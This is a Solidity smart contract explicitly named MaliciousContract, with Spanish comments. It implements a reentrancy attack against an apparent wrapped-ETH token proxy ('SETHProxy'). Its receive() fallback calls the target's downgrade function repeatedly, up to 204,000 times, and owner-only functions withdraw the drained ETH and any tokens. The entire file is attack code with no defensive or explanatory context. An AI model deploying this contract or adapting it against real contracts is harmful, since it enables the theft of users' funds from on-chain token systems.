// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.7.6;

interface SETHProxy {
    function upgradeByETH() external payable;
    function downgrade(uint256 wad) external;
}

contract MaliciousContract {
    SETHProxy private target;
    uint256 private attackCount;
    uint256 private constant MAX_ATTACK_COUNT = 204000;
    address private _owner;
    address private wadTokenAddress;

    constructor(SETHProxy _target, address _wadTokenAddress) {
        target = _target;
        wadTokenAddress = _wadTokenAddress;
        _owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }

    // Función de fallback para recibir ETH
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            // Lanzar el ataque de reentrancia llamando a downgrade repetidamente
            if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
                IERC20(wadTokenAddress).approve(address(target), uint256(-1));
            }
            target.downgrade(1 ether);
            attackCount++;
            (bool success,) = address(target).call(abi.encodeWithSignature("downgrade(uint256)", 1 ether));
            require(success, "Failed to call downgrade");
        } else {
            revert("Max attack count reached");
        }
    }

    // Función para iniciar el ataque
    function initiateAttack() external payable {
        // Enviar ETH al contrato objetivo para activar el ataque de reentrancia
        target.upgradeByETH{value: msg.value}();

        // Llamar a la función downgrade para iniciar el ataque de reentrancia
        if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
            IERC20(wadTokenAddress).approve(address(target), uint256(-1));
        }
        target.downgrade(1 ether);
        attackCount++;
        (bool success,) = address(target).call(abi.encodeWithSignature("downgrade(uint256)", 1 ether));
        require(success, "Failed to call downgrade");
    }

    // Retirar los ETH obtenidos del ataque
    function withdraw() external onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // Función para verificar si se alcanzó el número máximo de ataques
    function isMaxAttackCountReached() external view returns (bool) {
        return attackCount >= MAX_ATTACK_COUNT;
    }

    function clearETH(address payable _withdrawal) public onlyOwner {
        uint256 amount = address(this).balance;
        (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
        require(success, "Failed to transfer Ether");
    }

    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }
    function approveAndCallTarget(uint256 amount) external onlyOwner {
        if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
            IERC20(wadTokenAddress).approve(address(target), uint256(-1));
        }
        target.downgrade(amount);
    }
}